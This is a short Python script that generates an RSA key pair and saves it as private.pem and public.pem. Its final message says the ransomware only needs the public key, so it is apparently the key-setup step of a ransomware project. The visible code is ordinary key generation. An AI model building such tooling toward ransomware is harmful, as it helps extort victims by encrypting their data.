from Cryptodome.PublicKey import RSA

key = RSA.generate(2048)

private_key = key.export_key()
with open("private.pem", "wb") as f:
    f.write(private_key)

public_key = key.publickey().export_key()
with open("public.pem", "wb") as f:
    f.write(public_key)

print("Successfully created 'private.pem' and 'public.pem'.")
print("Keep 'private.pem' safe. The ransomware only needs 'public.pem'.")